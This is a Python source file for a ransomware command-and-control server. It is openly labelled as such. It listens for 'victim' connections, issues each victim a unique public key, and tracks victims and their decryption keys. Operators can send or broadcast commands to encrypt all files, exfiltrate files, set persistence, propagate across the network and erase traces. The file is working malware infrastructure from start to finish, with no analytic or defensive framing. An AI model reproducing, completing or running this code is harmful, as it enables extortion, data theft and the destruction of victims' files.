# server.py - Main C2 Server
import socket
import threading
import json
import time
import os
import struct
from key_manager import KeyManager, generate_victim_id

# ==================== Server Configuration ====================
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 1234
BUFFER_SIZE = 4096
MAX_CONNECTIONS = 10

# ==================== Command Definitions ====================
COMMANDS = {
    "ENCRYPT_ALL": "Encrypt all target files on victim machine",
    "DECRYPT_ALL": "Decrypt all encrypted files (requires private key)",
    "SCAN_FILES": "Scan and report target files found",
    "GET_STATUS": "Get current encryption status and statistics",
    "CHANGE_EXTENSION": "Change encryption extension",
    "UPDATE_TARGETS": "Update target file extensions",
    "EXFILTRATE_FILES": "Exfiltrate specific files to server",
    "PERSIST": "Ensure persistence on victim machine",
    "PROPAGATE": "Attempt network propagation",
    "SELF_DESTRUCT": "Remove all traces from victim machine"
}


class C2Server:
    def __init__(self, host=SERVER_HOST, port=SERVER_PORT):
        self.host = host
        self.port = port
        self.clients = {}
        self.server_socket = None
        self.key_manager = KeyManager()
        self.running = False

        # Initialize key management
        if not self.key_manager.load_server_keys():
            print("[-] Failed to initialize key management")
            return

    def start_server(self):
        """Start the C2 server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(MAX_CONNECTIONS)

            self.running = True
            print(f"[+] C2 Server started on {self.host}:{self.port}")
            print(f"[+] Public key ready for victim connections")
            print(f"[+] Available commands: {', '.join(COMMANDS.keys())}")

            self.accept_connections()

        except Exception as e:
            print(f"[-] Server error: {e}")
            self.running = False

    def accept_connections(self):
        """Accept incoming victim connections"""
        while self.running:
            try:
                client_socket, client_address = self.server_socket.accept()
                print(f"[+] New victim connected: {client_address}")

                # Handle client in separate thread
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, client_address)
                )
                client_thread.daemon = True
                client_thread.start()

            except Exception as e:
                if self.running:
                    print(f"[-] Connection error: {e}")

    def handle_client(self, client_socket, client_address):
        """Handle communication with a victim client"""
        victim_id = generate_victim_id(client_address[0])

        self.clients[victim_id] = {
            'socket': client_socket,
            'address': client_address,
            'connected': True,
            'last_seen': time.time()
        }

        try:
            # Generate unique key pair for this victim
            victim_public_key = self.key_manager.generate_victim_keypair(victim_id)

            # Send victim-specific public key
            key_message = {
                'type': 'PUBLIC_KEY',
                'data': victim_public_key.decode('utf-8'),
                'victim_id': victim_id
            }
            self.send_message(client_socket, key_message)

            print(f"[+] Sent unique public key to victim {victim_id}")

            while self.clients[victim_id]['connected']:
                # Receive messages from victim
                message = self.receive_message(client_socket)
                if not message:
                    break

                self.process_victim_message(victim_id, message)
                self.clients[victim_id]['last_seen'] = time.time()

        except Exception as e:
            print(f"[-] Client {victim_id} error: {e}")
        finally:
            self.clients[victim_id]['connected'] = False
            client_socket.close()
            print(f"[-] Victim disconnected: {victim_id}")

    def send_message(self, socket, message):
        """Send JSON message to client"""
        try:
            data = json.dumps(message).encode('utf-8')
            socket.sendall(struct.pack('>I', len(data)) + data)
            return True
        except Exception as e:
            print(f"[-] Send error: {e}")
            return False

    def receive_message(self, socket):
        """Receive JSON message from client"""
        try:
            raw_length = socket.recv(4)
            if not raw_length:
                return None
            length = struct.unpack('>I', raw_length)[0]

            data = b''
            while len(data) < length:
                packet = socket.recv(min(4096, length - len(data)))
                if not packet:
                    return None
                data += packet

            return json.loads(data.decode('utf-8'))
        except Exception as e:
            print(f"[-] Receive error: {e}")
            return None

    def process_victim_message(self, victim_id, message):
        """Process incoming messages from victims"""
        msg_type = message.get('type')

        if msg_type == 'STATUS_UPDATE':
            status_data = message.get('data', {})
            print(f"[+] {victim_id} - {status_data.get('message', 'Unknown status')}")
            if 'encrypted_count' in status_data:
                print(f"    Encrypted: {status_data['encrypted_count']} files")

        elif msg_type == 'FILE_LIST':
            files = message.get('data', [])
            print(f"[+] {victim_id} - Found {len(files)} target files")

        elif msg_type == 'ENCRYPTION_RESULT':
            result = message.get('data', {})
            encrypted = result.get('encrypted', 0)
            failed = result.get('failed', 0)
            print(f"[+] {victim_id} - Encryption: {encrypted} success, {failed} failed")

        elif msg_type == 'ERROR':
            error = message.get('data', 'Unknown error')
            print(f"[-] {victim_id} - Error: {error}")

        elif msg_type == 'VICTIM_INFO':
            info = message.get('data', {})
            print(f"[+] {victim_id} - System: {info.get('os', 'Unknown')}")

    def send_command(self, victim_id, command, parameters=None):
        """Send command to specific victim"""
        if victim_id not in self.clients or not self.clients[victim_id]['connected']:
            print(f"[-] Victim {victim_id} not connected")
            return False

        message = {
            'type': 'COMMAND',
            'command': command,
            'parameters': parameters or {},
            'timestamp': time.time()
        }

        try:
            success = self.send_message(self.clients[victim_id]['socket'], message)
            if success:
                print(f"[+] Sent command '{command}' to {victim_id}")
                return True
            else:
                return False
        except Exception as e:
            print(f"[-] Failed to send command to {victim_id}: {e}")
            return False

    def broadcast_command(self, command, parameters=None):
        """Send command to all connected victims"""
        results = {}
        for victim_id in list(self.clients.keys()):
            if self.clients[victim_id]['connected']:
                results[victim_id] = self.send_command(victim_id, command, parameters)
        return results

    def list_clients(self):
        """List all connected victims"""
        if not any(client['connected'] for client in self.clients.values()):
            print("[-] No victims connected")
            return []

        connected_victims = []
        print("\n[+] Connected Victims:")
        for i, (victim_id, client_info) in enumerate(self.clients.items(), 1):
            if client_info['connected']:
                connected_victims.append(victim_id)
                last_seen = time.time() - client_info['last_seen']
                print(f"  {i}. {victim_id} - {client_info['address'][0]} (seen {last_seen:.0f}s ago)")

        return connected_victims

    def export_decryption_key(self, victim_id):
        """Export decryption key for a victim"""
        return self.key_manager.export_decryption_key(victim_id)

    def list_victim_keys(self):
        """List all stored victim keys"""
        return self.key_manager.list_victim_keys()

    def interactive_mode(self):
        """Start interactive command mode"""
        print("\n[+] Starting interactive mode...")
        print("[+] Type 'help' for available commands")

        while True:
            try:
                command = input("\nC2> ").strip().split()
                if not command:
                    continue

                cmd = command[0].upper()

                if cmd == 'HELP':
                    self.show_help()

                elif cmd == 'LIST':
                    self.list_clients()

                elif cmd == 'KEYS':
                    keys = self.list_victim_keys()
                    if keys:
                        print("\n[+] Stored Victim Keys:")
                        for key in keys:
                            print(f"  - {key}")
                    else:
                        print("[-] No victim keys stored")

                elif cmd == 'EXPORT_KEY':
                    if len(command) < 2:
                        print("Usage: export_key <victim_id>")
                        continue
                    victim_id = command[1]
                    self.export_decryption_key(victim_id)

                elif cmd == 'BROADCAST':
                    if len(command) < 2:
                        print("Usage: broadcast <command>")
                        continue
                    sub_cmd = command[1].upper()
                    if sub_cmd in COMMANDS:
                        self.broadcast_command(sub_cmd)
                    else:
                        print(f"Unknown command: {sub_cmd}")

                elif cmd == 'SEND':
                    if len(command) < 3:
                        print("Usage: send <victim_id> <command>")
                        continue
                    victim_id = command[1]
                    sub_cmd = command[2].upper()
                    if sub_cmd in COMMANDS:
                        self.send_command(victim_id, sub_cmd)
                    else:
                        print(f"Unknown command: {sub_cmd}")

                elif cmd == 'EXIT':
                    print("[+] Shutting down server...")
                    self.running = False
                    break

                else:
                    print(f"Unknown command: {cmd}")

            except KeyboardInterrupt:
                print("\n[+] Shutting down server...")
                self.running = False
                break
            except Exception as e:
                print(f"Error: {e}")

    def show_help(self):
        """Show available commands"""
        print("\n[+] Server Commands:")
        print("  help                    - Show this help")
        print("  list                    - List connected victims")
        print("  keys                    - List stored victim keys")
        print("  export_key <victim_id>  - Export decryption key for victim")
        print("  broadcast <command>     - Send command to all victims")
        print("  send <victim> <command> - Send command to specific victim")
        print("  exit                    - Exit interactive mode")

        print("\n[+] Victim Commands:")
        for cmd, desc in COMMANDS.items():
            print(f"  {cmd:<20} - {desc}")


# ==================== Utility Functions ====================
def get_local_ip():
    """Get local IP address for network scanning"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"


# ==================== Main Execution ====================
if __name__ == "__main__":
    print("=== Ransomware C2 Server ===")
    print(f"[+] Local IP: {get_local_ip()}")

    server = C2Server()

    # Start server in background thread
    server_thread = threading.Thread(target=server.start_server)
    server_thread.daemon = True
    server_thread.start()

    # Wait a moment for server to start
    time.sleep(2)

    # Start interactive mode
    server.interactive_mode()